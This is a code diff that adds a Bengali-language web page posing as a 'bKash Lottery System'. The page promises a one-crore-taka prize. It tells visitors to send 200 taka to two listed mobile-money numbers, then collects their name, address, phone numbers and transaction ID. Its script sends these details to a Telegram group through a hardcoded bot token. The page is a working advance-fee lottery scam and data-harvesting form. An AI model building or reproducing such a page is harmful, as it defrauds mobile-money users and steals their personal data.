@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>বিকাশ লটারি সিস্টেম</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #eaf4ff;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            max-width: 500px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 15px rgba(0,0,0,0.1);
+        }
+        .bikash-theme {
+            background-color: #e2136e;
+            color: white;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .bikash-theme h2 {
+            margin: 0;
+            font-size: 20px;
+        }
+        .bikash-theme p {
+            margin: 5px 0;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        input, select {
+            width: 100%;
+            padding: 10px;
+            font-size: 14px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-sizing: border-box;
+        }
+        button {
+            background-color: #e2136e;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        button:hover {
+            background-color: #c1105c;
+        }
+        #responseMessage {
+            margin-top: 15px;
+            padding: 10px;
+            border-radius: 4px;
+            display: none;
+            font-size: 14px;
+        }
+        .success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="bikash-theme">
+            <h2>বিকাশ লটারি সিস্টেম</h2>
+            <p>এটি অনলাইন লটারির একটি মাধ্যম ।অংশগ্রহণ করার জন্য সকল তথ্য পড়ুন এবং নিচে স্ক্রল করে তথ্য দিন, ভুল তথ্য দিলে লটারিতে অংশগ্রহণ করতে পারবেন না   </p>
+                <h1 id="title">🎯 লটারি অংশগ্রহণের শর্তাবলী</h1>
+      <p class="subtitle">অনুগ্রহ করে নিচের শর্তগুলি মনোযোগ দিয়ে পড়ুন এবং সম্মতি দিন।</p>
+
+      <ol>
+        <li>লটারিতে অংশগ্রহণ করার পর আপনার দেওয়া সকল তথ্য আমাদের কাছে পৌঁছাবে।যাচাইকরে তথ্য সঠিক হলে লটারিতে অংশগ্রহণের জন্য কনফার্মেশন একটি মেসেজ পাবেন , এবং ভুল তথ্য দিলে পাবেন না </li>
+        <li>প্রতিমাসের ৩০ অথবা ৩১ তারিখ আমরা ড্র আয়োজন করি।</li>
+        <li>ড্র-তে ১ কোটি টাকা পুরস্কার ঘোষণা করা হয় এবং একজন ভাগ্যবান বিজয়ী নির্বাচিত হন।</li>
+        <li>প্রধান পুরস্কারপ্রাপ্ত বিজয়ী ১ কোটি টাকা পুরস্কার পাবেন।</li>
+        <li>অন্যান্য সকল অংশগ্রহণকারীকে একটি করে কলম উপহার দেওয়া হবে।</li>
+        <li>অংশগ্রহণের মাধ্যমে আপনি সম্মত হচ্ছেন যে, আপনার অর্থ হারালে অনলাইন লটারি প্রতিষ্ঠান কোন ধরনের দায়বদ্ধ থাকবে না।</li>
+      </ol>
+
+      <div class="note" aria-live="polite">
+        📌 যদি উপরের শর্তাবলীর সাথে একমত হন, তাহলে এখনই অংশগ্রহণ করুন!
+      </div>
+
+      <label class="agree">
+        <input type="checkbox" id="agreeChk" />
+        <span>আমি উপরোক্ত শর্তাবলীর সাথে একমত।</span>
+      </label>
+<p>একমত হলে নিচের বিকাশ নাম্বারে ২০০ টাকা সেন্ডমানি করে সকল তথ্য দিন ।ভুল তথ্য দিলে লটারিতে অংশগ্রহণ করতে পারবেন না ।</p>
+
+            <p><strong>বিকাশ/ নম্বর: 01797347638</strong></p>
+            <p><strong>অতিরিক্ত বিকাশ/নগদ নম্বর: 01560013881</strong></p>
+        </div>
+        
+        <form id="lotteryForm">
+            <div class="form-group">
+                <label for="name">পুরো নাম</label>
+                <input type="text" id="name" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="address">ঠিকানা</label>
+                <input type="text" id="address" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">আপনার মোবাইল নম্বর (যে নম্বর থেকে টাকা পাঠিয়েছেন)</label>
+                <input type="tel" id="phone" required>
+            </div>
+
+            <div class="form-group">
+                <label for="sentTo">কোন বিকাশ নম্বরে টাকা পাঠিয়েছেন</label>
+                <select id="sentTo" required>
+                    <option value="01797347638">01797347638</option>
+                    <option value="01560013881">01560013881</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="contactPhone">মোবাইল নম্বর (যে নাম্বারে ফোন দিলে আপনাকে পাওয়া যাবে)</label>
+                <input type="tel" id="contactPhone" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="amount">পরিমাণ (টাকায়)</label>
+                <input type="number" id="amount" value="200" readonly>
+            </div>
+            
+            <div class="form-group">
+                <label for="trxid">ট্রানজেকশন আইডি</label>
+                <input type="text" id="trxid" required>
+            </div>
+            
+            <button type="submit">সাবমিট করুন</button>
+        </form>
+        
+        <div id="responseMessage"></div>
+    </div>
+
+    <script>
+        document.getElementById('lotteryForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const formData = {
+                name: document.getElementById('name').value.trim(),
+                address: document.getElementById('address').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                sentTo: document.getElementById('sentTo').value,
+                contactPhone: document.getElementById('contactPhone').value.trim(),
+                amount: document.getElementById('amount').value,
+                trxid: document.getElementById('trxid').value.trim()
+            };
+            
+            const responseMessage = document.getElementById('responseMessage');
+            responseMessage.style.display = 'none';
+            
+            try {
+                const TELEGRAM_BOT_TOKEN = '8400651328:AAGQ7dE8COSKHhBpR9ZuaWOY_vTTYIUcEi4';
+                const TELEGRAM_GROUP_ID = '-1002295639462'; // এখানে সঠিক গ্রুপ আইডি বসাও
+                
+                const message = `
+📢 নতুন লটারি আবেদন
+👤 নাম: ${formData.name}
+🏠 ঠিকানা: ${formData.address}
+📱 মোবাইল (টাকা পাঠানো): ${formData.phone}
+📤 যে নম্বরে টাকা পাঠিয়েছেন: ${formData.sentTo}
+📞 যোগাযোগের নম্বর: ${formData.contactPhone}
+💰 পরিমাণ: ${formData.amount} টাকা
+🆔 ট্রানজেকশন আইডি: ${formData.trxid}
+                `;
+                
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_GROUP_ID,
+                        text: message
+                    })
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    responseMessage.textContent = '✅ আপনার আবেদন সফলভাবে জমা হয়েছে!';
+                    responseMessage.className = 'success';
+                    document.getElementById('lotteryForm').reset();
+                } else {
+                    responseMessage.textContent = '⚠️ সমস্যা হয়েছে: ' + (data.description || 'অজানা সমস্যা');
+                    responseMessage.className = 'error';
+                }
+                
+                responseMessage.style.display = 'block';
+                
+            } catch (error) {
+                responseMessage.textContent = '❌ নেটওয়ার্ক সমস্যা। পরে আবার চেষ্টা করুন।';
+                responseMessage.className = 'error';
+                responseMessage.style.display = 'block';
+            }
+        });
+    </script>
+</body>
+</html>
